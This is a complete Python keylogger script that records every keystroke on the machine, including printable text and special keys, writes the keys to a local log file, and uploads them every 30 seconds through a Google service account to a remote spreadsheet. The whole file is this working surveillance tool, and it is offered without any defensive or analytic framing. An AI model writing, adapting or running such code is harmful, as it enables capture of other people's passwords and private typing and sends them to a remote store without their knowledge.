"""
Keystroke Logger — saves every keystroke to Google Sheets and a local backup file.

Sheet columns: Session ID | Date | Time | Keys Typed
Strokes are batched and flushed to Sheets every FLUSH_INTERVAL seconds.
Press ESC to stop.
"""

from pynput import keyboard
import threading
import time
import uuid
from datetime import datetime

import gspread
from google.oauth2.service_account import Credentials

# ──────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────
SERVICE_ACCOUNT_FILE = "keylogger-database-13f0c3b13a4e.json"
SPREADSHEET_NAME     = "Keylogger Logs"
FLUSH_INTERVAL       = 30        # seconds between Google Sheets uploads
LOCAL_BACKUP_FILE    = "keylog.txt"

SCOPES = [
    "https://www.googleapis.com/auth/spreadsheets",
    "https://www.googleapis.com/auth/drive",
]

HEADER_ROW = ["Session ID", "Date", "Time", "Keys Typed"]

# ──────────────────────────────────────────────
# Global state
# ──────────────────────────────────────────────
SESSION_ID  = str(uuid.uuid4())[:8].upper()   # short unique tag per run
buffer: list = []
lock        = threading.Lock()
worksheet   = None          # gspread Worksheet object
stop_event  = threading.Event()


# ──────────────────────────────────────────────
# Google Sheets setup
# ──────────────────────────────────────────────
def init_google_sheets():
    """Authenticate and open (or create) the target spreadsheet."""
    global worksheet
    try:
        creds = Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
        gc    = gspread.authorize(creds)

        # Open existing spreadsheet or create a new one
        try:
            sh = gc.open(SPREADSHEET_NAME)
            print(f"  ✓ Opened spreadsheet: '{SPREADSHEET_NAME}'")
        except gspread.SpreadsheetNotFound:
            sh = gc.create(SPREADSHEET_NAME)
            print(f"  ✓ Created spreadsheet: '{SPREADSHEET_NAME}'")

        worksheet = sh.sheet1

        # Add header row if the sheet is empty
        existing = worksheet.get_all_values()
        if not existing or existing[0] != HEADER_ROW:
            worksheet.insert_row(HEADER_ROW, index=1)
            print("  ✓ Header row added")

        print(f"  ✓ Google Sheets ready  (session {SESSION_ID})")
        return True

    except Exception as e:
        print(f"  ✗ Google Sheets init failed: {e}")
        return False


# ──────────────────────────────────────────────
# Flushing captured keystrokes
# ──────────────────────────────────────────────
def flush_buffer():
    """
    Drain the buffer and write one row to Google Sheets.
    Row format: Session ID | Date | Time | Keys Typed
    """
    global buffer

    with lock:
        if not buffer:
            return
        keys_typed = "".join(buffer)
        buffer = []

    now      = datetime.now()
    date     = now.strftime("%Y-%m-%d")
    time_str = now.strftime("%H:%M:%S")

    # Local backup (always written even if Sheets fails)
    try:
        with open(LOCAL_BACKUP_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{date} {time_str}] {keys_typed}\n")
    except Exception as e:
        print(f"  ⚠ Local backup write failed: {e}")

    # Google Sheets upload
    if worksheet:
        try:
            worksheet.append_row(
                [SESSION_ID, date, time_str, keys_typed],
                value_input_option="USER_ENTERED",
            )
            print(f"  ↑ Uploaded {len(keys_typed)} chars to Sheets  [{time_str}]")
        except Exception as e:
            print(f"  ✗ Sheets upload failed: {e}")
    else:
        print(f"  ⚠ Sheets unavailable — saved to local backup only")


def periodic_flush():
    """Background thread: flush the buffer every FLUSH_INTERVAL seconds."""
    while not stop_event.is_set():
        time.sleep(FLUSH_INTERVAL)
        flush_buffer()


# ──────────────────────────────────────────────
# Keyboard listener callbacks
# ──────────────────────────────────────────────
def on_press(key):
    """Convert a keypress to a readable string and append to buffer."""
    try:
        if hasattr(key, "char") and key.char is not None:
            char = key.char                          # printable character
        elif key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "[ENTER]"
        elif key == keyboard.Key.tab:
            char = "[TAB]"
        elif key == keyboard.Key.backspace:
            char = "[BKSP]"
        elif key == keyboard.Key.delete:
            char = "[DEL]"
        elif key == keyboard.Key.caps_lock:
            char = "[CAPS]"
        elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
            char = "[SHIFT]"
        elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            char = "[CTRL]"
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            char = "[ALT]"
        elif key == keyboard.Key.esc:
            char = "[ESC]"
        else:
            char = f"[{key.name.upper()}]"

        with lock:
            buffer.append(char)

    except Exception as e:
        print(f"  ✗ on_press error: {e}")


def on_release(key):
    """Stop listener when ESC is released."""
    if key == keyboard.Key.esc:
        stop_event.set()
        return False        # stops the listener


# ──────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 60)
    print("       KEYSTROKE LOGGER  →  Google Sheets")
    print("=" * 60)
    print(f"  Session ID   : {SESSION_ID}")
    print(f"  Spreadsheet  : {SPREADSHEET_NAME}")
    print(f"  Flush every  : {FLUSH_INTERVAL} seconds")
    print(f"  Local backup : {LOCAL_BACKUP_FILE}")
    print("=" * 60)

    sheets_ok = init_google_sheets()
    if not sheets_ok:
        print("\n  ⚠  Running in LOCAL BACKUP ONLY mode.\n")

    # Start background flush thread
    flush_thread = threading.Thread(target=periodic_flush, daemon=True)
    flush_thread.start()

    print("\n  ▶  Logging started.  Press ESC to stop.\n")

    # Start keyboard listener (blocks until ESC)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Final flush on exit
    print("\n  ■  Stopping — flushing remaining keystrokes...")
    flush_buffer()
    print("  ✓  Done. Goodbye!")
